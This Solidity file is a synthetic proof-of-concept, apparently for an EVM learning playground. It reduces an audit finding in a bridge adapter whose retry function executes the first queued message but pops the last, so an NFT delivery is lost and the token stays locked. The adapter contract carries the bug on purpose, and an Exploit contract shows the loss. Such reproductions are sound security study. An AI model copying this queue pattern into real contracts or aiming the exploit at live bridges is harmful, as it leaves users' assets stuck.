// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Sweep n Flip Bridge — LayerZeroAdapter.executeMessages pops the wrong
    pending message (Cantina, Nov 2024; finding #46494)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: executeMessages reads/executes pending[0] but then array.pop()
    removes the LAST element. With two failed deliveries [msg1, msg2]:
      executeMessages(1) → executes msg1, pops msg2 → pending = [msg1]
      executeMessages(1) → re-executes msg1 (already done / reverts), pops msg1
      → msg2 is GONE forever, never delivered.

    Harm: NFT delivery message permanently lost → NFT stuck in bridge custody.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal Bridge that applies receiveERC721 deliveries (or reverts when
///      disabled — used to force messages into the pending queue).
contract Bridge {
    mapping(uint256 => address) public ownerOf; // tokenId => owner after delivery
    mapping(uint256 => bool) public delivered;
    bool public deliveriesEnabled = true;

    function setDeliveriesEnabled(bool ok) external {
        deliveriesEnabled = ok;
    }

    function receiveERC721(address to, uint256 tokenId) external {
        require(deliveriesEnabled, "DELIVERIES_DISABLED");
        require(!delivered[tokenId], "ALREADY_DELIVERED");
        delivered[tokenId] = true;
        ownerOf[tokenId] = to;
    }
}

/// @notice Reduced LayerZeroAdapter — stores failed payloads and retries them.
contract LayerZeroAdapter {
    Bridge public immutable bridge;
    bytes[] internal s_pendingMessagesToExecute;

    // Custody simulation: NFTs locked until a successful receiveERC721.
    mapping(uint256 => bool) public lockedInBridge;

    constructor(Bridge bridge_) {
        bridge = bridge_;
    }

    /// @dev Simulate an inbound LZ message that fails delivery → queued.
    function storeFailedMessage(address to, uint256 tokenId) external {
        lockedInBridge[tokenId] = true;
        bytes memory payload = abi.encodeCall(Bridge.receiveERC721, (to, tokenId));
        s_pendingMessagesToExecute.push(payload);
    }

    function getPendingMessagesToExecuteCount() external view returns (uint256) {
        return s_pendingMessagesToExecute.length;
    }

    /// @notice Retry up to `limitToExecute_` pending messages.
    function executeMessages(uint256 limitToExecute_) external {
        uint256 n = limitToExecute_;
        if (n > s_pendingMessagesToExecute.length) {
            n = s_pendingMessagesToExecute.length;
        }
        for (uint256 i = 0; i < n; i++) {
            // Execute the FIRST pending message.
            bytes memory payload = s_pendingMessagesToExecute[0];
            (bool ok,) = address(bridge).call(payload);
            if (ok) {
                // Decode tokenId to clear lock (payload = receiveERC721(to, tokenId)).
                (, uint256 tokenId) = abi.decode(_skipSelector(payload), (address, uint256));
                lockedInBridge[tokenId] = false;
            }

            // FIX: execute from the last index (swap-and-pop), or assign nonces per msg.
            // With [msg1, msg2]: executes msg1 but pop removes msg2 — msg2 irrecoverably lost.
            s_pendingMessagesToExecute.pop(); // @> VULN: pops LAST element, not the executed index-0 message
        }
    }

    function _skipSelector(bytes memory data) internal pure returns (bytes memory body) {
        require(data.length >= 4, "short");
        body = new bytes(data.length - 4);
        for (uint256 i = 4; i < data.length; i++) {
            body[i - 4] = data[i];
        }
    }
}

/// @dev Queues two failed deliveries, runs executeMessages(1) twice — token 2
///      is permanently lost from the pending queue while still locked.
contract Exploit {
    Bridge public bridge;
    LayerZeroAdapter public adapter;
    address public constant USER = address(0xBEEF);

    constructor() {
        bridge = new Bridge();
        adapter = new LayerZeroAdapter(bridge);
    }

    function run() external {
        // Force inbound deliveries into the pending queue (simulate bridge failure).
        bridge.setDeliveriesEnabled(false);
        adapter.storeFailedMessage(USER, 1);
        adapter.storeFailedMessage(USER, 2);
        require(adapter.getPendingMessagesToExecuteCount() == 2, "two pending");
        require(adapter.lockedInBridge(1) && adapter.lockedInBridge(2), "both locked");

        // Re-enable deliveries so retries can succeed when the correct msg runs.
        bridge.setDeliveriesEnabled(true);

        // First retry: executes msg1 (token 1) but pops msg2 (token 2) — LOST.
        adapter.executeMessages(1);
        require(bridge.delivered(1), "token 1 should be delivered");
        require(adapter.getPendingMessagesToExecuteCount() == 1, "one pending left");

        // Second retry: re-executes msg1 (ALREADY_DELIVERED → fails), pops last remaining.
        adapter.executeMessages(1);
        require(adapter.getPendingMessagesToExecuteCount() == 0, "queue empty");

        // HARM: token 2 was never delivered and is no longer in the pending queue —
        // irrecoverable. NFT remains locked; user never receives it.
        require(!bridge.delivered(2), "token 2 must never have been delivered");
        require(adapter.lockedInBridge(2), "token 2 permanently locked in bridge");
        require(bridge.ownerOf(2) == address(0), "user never received token 2");
    }
}
